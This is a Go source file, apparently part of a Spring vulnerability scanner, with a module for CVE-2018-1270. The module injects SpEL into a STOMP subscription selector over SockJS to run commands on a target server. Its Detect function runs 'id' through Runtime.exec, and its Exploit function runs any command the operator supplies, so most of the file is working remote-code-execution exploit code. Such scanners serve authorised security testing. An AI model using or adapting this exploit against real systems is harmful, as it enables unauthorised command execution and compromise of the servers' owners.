package vulns

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/sspsec/Scan-Spring-GO/internal/client"
	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2018-1270 Spring Messaging 的 STOMP SUBSCRIBE selector SpEL 注入。
// spring-messaging 基于 sockjs，可用纯 HTTP（xhr/htmlfile 传输）"降维"复现：
//  1. GET {base}/{server}/{session}/htmlfile 建立会话流（保持打开）；
//  2. POST {base}/{server}/{session}/xhr_send 依次发送
//     CONNECT / SUBSCRIBE（selector 为 SpEL）/ SEND（触发向订阅投递消息）；
//  3. selector 中的 SpEL 在消息投递时求值——把 exec 输出拼接进
//     selector 的真值判断，若消息成功投递回会话流，即为求值实证。
type cve20181270 struct{}

func init() { Register(&cve20181270{}) }

const msgSockJSPath = "gs-guide-websocket"

func (c *cve20181270) Info() model.Info {
	return model.Info{
		ID:         "CVE-2018-1270",
		Name:       "Spring Messaging SpEL RCE",
		Type:       "RCE",
		Severity:   "critical",
		Affected:   "Spring Framework 4.3.x-4.3.14 / 5.0.x-5.0.4（spring-messaging + STOMP）",
		Reference:  "https://tanzu.vmware.com/security/cve-2018-1270",
		HasExploit: true,
		ArgHint:    "要执行的命令（无回显，通过订阅投递判定求值）",
	}
}

func stompFrame(cmd string, headers map[string]string, body string) string {
	lines := []string{cmd}
	for k, v := range headers {
		lines = append(lines, k+":"+v)
	}
	// STOMP 帧结构：COMMAND\n头\n\n体\x00（体后直接跟 null，不能有换行）
	return strings.Join(lines, "\n") + "\n\n" + body + "\x00"
}

// Detect 走完整的 SockJS 会话：CONNECT → SUBSCRIBE（selector 含 exec id 的
// 真值判断）→ SEND 触发消息 → 轮询会话流中是否出现投递的 greeting。
// runStompFlow 执行完整的 SockJS 会话流程：
// 会话流 -> CONNECT -> SUBSCRIBE(selector) -> SEND 触发消息 -> 轮询投递。
// selector 求值为真时 greeting 才会投递回会话流，以此作为求值实证。
func (c *cve20181270) runStompFlow(ctx context.Context, t model.Target, selector string) bool {
	u := strings.TrimSuffix(t.URL, "/") + "/" + msgSockJSPath
	server := fmt.Sprintf("%d", rand.Intn(1000))
	session := fmt.Sprintf("ssp%08d", rand.Intn(100000000))

	var mu sync.Mutex
	stream := []byte{}

	// 会话流（htmlfile 传输）：保持打开，后台增量读取
	go func() {
		conn, err := dialStream(ctx, t, u+"/"+server+"/"+session+"/htmlfile?c=_jp.vulhub")
		if err != nil {
			return
		}
		defer conn.Close()
		buf := make([]byte, 4096)
		deadline := time.Now().Add(15 * time.Second)
		_ = conn.SetReadDeadline(deadline)
		for time.Now().Before(deadline) {
			n, rerr := conn.Read(buf)
			if n > 0 {
				mu.Lock()
				stream = append(stream, buf[:n]...)
				mu.Unlock()
			}
			if rerr != nil {
				return
			}
		}
	}()
	time.Sleep(1 * time.Second)

	send := func(command string, headers map[string]string, body string) bool {
		frame := stompFrame(command, headers, body)
		arr, _ := json.Marshal([]string{frame}) // sockjs xhr_send 要求 JSON 数组形态
		code, _, err := client.RawHTTP(ctx, t.Proxy, http.MethodPost,
			u+"/"+server+"/"+session+"/xhr_send?t="+fmt.Sprint(time.Now().UnixMilli()),
			map[string]string{"Content-Type": "application/json"}, string(arr))
		return err == nil && code == http.StatusNoContent
	}

	// CONNECT：等 SockJS 会话注册，重试发送
	connected := false
	for i := 0; i < 5; i++ {
		if send("CONNECT", map[string]string{
			"accept-version": "1.1,1.0", "heart-beat": "10000,10000"}, "") {
			connected = true
			if os.Getenv("SSP_DEBUG") != "" {
				fmt.Fprintf(os.Stderr, "[dbg-1270] CONNECT ok (第 %d 次)\n", i+1)
			}
			break
		}
		time.Sleep(700 * time.Millisecond)
	}
	if !connected {
		return false
	}

	send("SUBSCRIBE", map[string]string{
		"selector": selector, "id": "sub-0", "destination": "/topic/greetings"}, "")

	greeting := `{"name":"vulhub"}`
	send("SEND", map[string]string{
		"content-length": fmt.Sprint(len(greeting)), "destination": "/app/hello"}, greeting)

	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		mu.Lock()
		delivered := strings.Contains(string(stream), "greetings") ||
			strings.Contains(string(stream), "Hello")
		mu.Unlock()
		if delivered {
			return true
		}
		time.Sleep(500 * time.Millisecond)
	}
	return false
}

func (c *cve20181270) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	selector := `T(java.lang.Runtime).getRuntime().exec("id") != null`
	if c.runStompFlow(ctx, t, selector) {
		v.Vulnerable = true
		v.Evidence = "订阅消息（greeting）已投递回会话流，selector SpEL 确已求值"
		v.Detail = "命令经 Runtime.exec 单字符串执行，无回显，可经 OOB/落盘验证"
	}
	return v, nil
}

// Exploit 的 arg 为要执行的命令（selector 中 exec，无回显；
// greeting 投递即证明命令真实执行）。
func (c *cve20181270) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	esc := strings.ReplaceAll(strings.ReplaceAll(arg, `\`, `\\`), `"`, `\"`)
	selector := fmt.Sprintf(`T(java.lang.Runtime).getRuntime().exec("%s") != null`, esc)
	if c.runStompFlow(ctx, t, selector) {
		return "", "命令已执行（订阅消息投递实证：selector 求值为真）", nil
	}
	return "", "无回显漏洞：流程已执行但未能通过投递确认（命令可能失败或目标不适用）", nil
}

// cleanupStream 触发一次无效消息，让会话自然结束（尽力而为）。
func (c *cve20181270) cleanupStream(ctx context.Context, t model.Target, server, session string) {
	base := strings.TrimSuffix(t.URL, "/") + "/" + msgSockJSPath
	_, _, _ = client.RawHTTP(ctx, t.Proxy, http.MethodPost,
		base+"/"+server+"/"+session+"/xhr_close?t="+fmt.Sprint(time.Now().UnixMilli()), nil, "")
}

// dialStream 建立 htmlfile 会话流的原始连接。
// writeAllRaw 将字符串按原始字节写入连接。
func writeAllRaw(conn net.Conn, s string) error {
	_, err := conn.Write([]byte(s))
	return err
}

func dialStream(ctx context.Context, t model.Target, rawURL string) (net.Conn, error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}
	isTLS := u.Scheme == "https"
	conn, err := client.DialRaw(ctx, t.Proxy, u.Host, isTLS)
	if err != nil {
		return nil, err
	}
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", u.RequestURI(), u.Host)
	if werr := writeAllRaw(conn, req); werr != nil {
		conn.Close()
		return nil, werr
	}
	// 跳过响应头
	br := bufio.NewReader(conn)
	for {
		line, rerr := br.ReadString('\n')
		if rerr != nil || strings.TrimSpace(line) == "" {
			break
		}
	}
	return struct {
		net.Conn
		r *bufio.Reader
	}{conn, br}, nil
}
